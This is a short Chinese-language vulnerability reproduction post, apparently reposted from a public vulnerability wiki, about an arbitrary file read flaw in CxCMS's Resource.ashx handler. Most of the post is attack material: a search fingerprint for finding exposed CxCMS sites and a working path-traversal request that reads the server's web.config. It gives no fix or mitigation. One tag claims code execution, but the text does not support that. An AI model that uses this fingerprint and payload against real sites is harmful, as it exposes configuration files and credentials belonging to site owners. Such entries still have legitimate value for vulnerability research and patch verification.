---
title: "CxCMS Resource.ashx 任意文件读取漏洞"
date: 2026-10-12 09:00:14
categories:
  - WebSecurity
  - CVE
  - "cms"
  - "CxCMS"
tags:
  - "CxCMS"
  - "代码执行"
  - "任意文件读取"
  - "漏洞复现"
---
## 漏洞描述

CxCMS 存在任意文件读取，由于 /Sys/Handler/Resource.ashx 页面 _FilePath 参数过滤不严，导致可以读取系统敏感文件。

## 漏洞影响

```
CxCMS
```

## 网络测绘

```
"Powered by CxCms"
```

## 漏洞复现

关键字"Powered by CxCms"

![image-20220518144245685](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cms/images/202205181442728.png)

验证POC

```
/Sys/Handler/Resource.ashx?_FilePath=../../web.config
```

![image-20220518144331101](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cms/images/202205181443193.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/cms/CxCMS-Resource.ashx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md)
